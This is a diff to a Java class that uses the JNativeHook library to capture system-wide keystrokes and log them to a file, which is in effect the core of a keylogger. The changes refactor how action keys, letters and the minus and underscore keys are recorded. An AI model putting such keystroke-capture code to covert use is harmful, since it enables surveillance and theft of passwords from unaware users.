@@ -6,7 +6,6 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
 public class KeyListener implements NativeKeyListener, AutoCloseable {
-	private StringBuilder stringBuilder;
 	private FileManager fileManager;
 
 	public KeyListener() throws IOException {
@@ -16,12 +15,20 @@ public class KeyListener implements NativeKeyListener, AutoCloseable {
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
 		if (isAction(keyEvent.getKeyCode())) {
-			stringBuilder = new StringBuilder("[" + NativeKeyEvent.getKeyText(keyEvent.getKeyCode()) + "]");
-			fileManager.log(stringBuilder.toString().toUpperCase());
+			String actionAsString = ("[" + NativeKeyEvent.getKeyText(keyEvent.getKeyCode()) + "]");
+			fileManager.log(actionAsString.toUpperCase());
 		}
-		if (isLetter(keyEvent.getKeyCode()) || isSpecialCharacter(keyEvent.getKeyCode())) {
+		if (isLetter(keyEvent.getKeyCode())) {
 			fileManager.log(NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
 			System.out.println(NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
+		}
+		switch (keyEvent.getKeyCode()) {
+		case NativeKeyEvent.VC_MINUS:
+			fileManager.log("-");
+			break;
+		case NativeKeyEvent.VC_UNDERSCORE:
+			fileManager.log("_");
+			break;
 		}
 	}
 
@@ -48,13 +55,6 @@ public class KeyListener implements NativeKeyListener, AutoCloseable {
 		return false;
 	}
 
-	private boolean isSpecialCharacter(int keyCode) {
-		if (keyCode == NativeKeyEvent.VC_MINUS || keyCode == NativeKeyEvent.VC_UNDERSCORE) {
-			return true;
-		}
-		return false;
-	}
-
 	@Override
 	public void nativeKeyReleased(NativeKeyEvent keyEvent) {
 	}
@@ -65,8 +65,6 @@ public class KeyListener implements NativeKeyListener, AutoCloseable {
 
 	@Override
 	public void close() throws Exception {
-		if (fileManager != null) {
-			fileManager.close();
-		}
+		fileManager.close();
 	}
 }
